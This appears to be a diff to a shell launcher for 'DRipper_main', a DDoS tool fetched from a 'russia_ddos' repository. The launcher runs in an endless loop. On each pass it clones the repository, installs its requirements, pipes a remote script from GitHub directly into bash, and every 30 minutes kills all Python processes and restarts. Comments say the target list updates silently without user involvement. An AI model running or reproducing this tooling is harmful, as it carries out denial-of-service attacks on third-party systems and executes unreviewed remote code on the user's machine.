@@ -1,6 +1,6 @@
 ##### This script will start and manage DRipper_main script
-##### Advantages of launching DRipper_main not directly but via this script is DRipper_main can be modified on the fly,
-##### and all code updates, including list of targets will update automatically without user interaction.
+##### Advantages of launching DRipper_main indirectly via this script is DRipper_main can be still modified on the fly,
+##### and all code updates, including list of targets will update automatically without user interaction after every relaunch (default 30 min)
 
 ##### To stop this script press CTRL+C several times
 
@@ -17,12 +17,12 @@ if [ ! -f /usr/bin/git ]; then
    sudo apt install git
 fi
 
-
 while true
 do
    
    # Install latest version of DDripper
    cd ~
+   rm -rf russia_ddos
    git clone https://github.com/alexmon1989/russia_ddos.git
    cd russia_ddos
    pip install -r requirements.txt
@@ -30,7 +30,7 @@ do
    # Run main script
    curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_main | bash
 
-   # Restart DRipper_main after restart_time seconds
+   # Restart DRipper_main after restart_time seconds (default 1800s == 30m)
    sleep $restart_time
    pkill -9 python; pkill -9 python3
 done
